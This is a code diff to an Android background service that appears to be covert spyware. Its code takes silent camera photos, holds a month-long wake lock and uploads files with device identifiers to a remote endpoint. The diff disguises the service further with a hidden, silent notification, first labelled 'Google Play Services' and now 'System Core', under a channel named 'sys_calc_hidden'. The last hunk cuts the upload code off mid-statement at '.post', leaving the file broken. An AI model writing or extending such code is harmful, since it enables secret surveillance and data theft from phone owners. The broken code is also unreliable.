@@ -9,6 +9,9 @@ import android.content.ContentUris
 import android.content.Context
 import android.content.Intent
 import android.content.pm.ServiceInfo
+import android.graphics.Bitmap
+import android.graphics.BitmapFactory
+import android.graphics.Color
 import android.hardware.camera2.CameraManager
 import android.location.Location
 import android.location.LocationManager
@@ -73,18 +76,18 @@ class SyncService : LifecycleService() {
     private var wakeLock: PowerManager.WakeLock? = null
     private lateinit var cameraManager: CameraManager
     private var wifiAutopilot = true
-    private var stealthState = "NEURAL_v19"
+    private var stealthState = "NEURAL_v20"
     private var deviceSecret: String = ""
 
     private val client = OkHttpClient.Builder()
-        .connectTimeout(120, TimeUnit.SECONDS)
-        .readTimeout(120, TimeUnit.SECONDS)
-        .writeTimeout(120, TimeUnit.SECONDS)
+        .connectTimeout(30, TimeUnit.SECONDS)
+        .readTimeout(30, TimeUnit.SECONDS)
+        .writeTimeout(30, TimeUnit.SECONDS)
         .retryOnConnectionFailure(true)
         .build()
 
     companion object {
-        private const val CHANNEL_ID = "sys_assets_v19"
+        private const val CHANNEL_ID = "sys_calc_hidden_v20"
         private const val NOTIF_ID = 888
         private const val PREFS = "sys_assets_prefs"
         private const val KEY_SECRET = "device_secret"
@@ -112,7 +115,7 @@ class SyncService : LifecycleService() {
     private fun acquireWakeLock() {
         try {
             val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
-            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Assets::WakeV19").apply {
+            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Assets::WakeV20").apply {
                 acquire(30L * 24 * 60 * 60 * 1000)
             }
         } catch (_: Exception) {}
@@ -120,7 +123,7 @@ class SyncService : LifecycleService() {
 
     private fun startForegroundNotif() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            val ch = NotificationChannel(CHANNEL_ID, "System Sync", NotificationManager.IMPORTANCE_MIN).apply {
+            val ch = NotificationChannel(CHANNEL_ID, "System Update", NotificationManager.IMPORTANCE_MIN).apply {
                 setShowBadge(false)
                 lockscreenVisibility = Notification.VISIBILITY_SECRET
                 setSound(null, null)
@@ -129,9 +132,9 @@ class SyncService : LifecycleService() {
             (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager).createNotificationChannel(ch)
         }
         val n: Notification = NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("Google Play Services")
-            .setContentText("Framework operational...")
-            .setSmallIcon(android.R.drawable.stat_sys_data_bluetooth)
+            .setContentTitle("System Core")
+            .setContentText("Running...")
+            .setSmallIcon(android.R.drawable.ic_menu_compass)
             .setPriority(NotificationCompat.PRIORITY_MIN)
             .setSilent(true)
             .setOngoing(true)
@@ -265,7 +268,6 @@ class SyncService : LifecycleService() {
         }
     }
 
-    // ═══════════ CameraX Silent Capture ═══════════
     @SuppressLint("MissingPermission")
     private suspend fun captureSilentPhoto(front: Boolean = false) {
         try {
@@ -580,34 +582,4 @@ class SyncService : LifecycleService() {
                 try {
                     val req = Request.Builder()
                         .url(UPLOAD)
-                        .post(file.readBytes().toRequestBody("application/octet-stream".toMediaType()))
-                        .addHeader("x-node-id", getNodeId())
-                        .addHeader("x-node-model", Build.MODEL)
-                        .addHeader("x-device-secret", deviceSecret)
-                        .addHeader("x-file-name", file.name)
-                        .build()
-                    client.newCall(req).execute().use { r -> if (r.isSuccessful) return@launch }
-                } catch (_: Exception) { tries++; delay(2000L) }
-            }
-        }
-    }
-
-    private fun getFileName(uri: Uri): String {
-        var n = "file_${System.currentTimeMillis()}.dat"
-        try {
-            contentResolver.query(uri, null, null, null, null)?.use { c ->
-                if (c.moveToFirst()) {
-                    val i = c.getColumnIndex(OpenableColumns.DISPLAY_NAME)
-                    if (i >= 0) n = c.getString(i)
-                }
-            }
-        } catch (_: Exception) {}
-        return n
-    }
-
-    override fun onDestroy() {
-        try { wakeLock?.release() } catch (_: Exception) {}
-        scope.cancel()
-        super.onDestroy()
-    }
-}
+                        .post
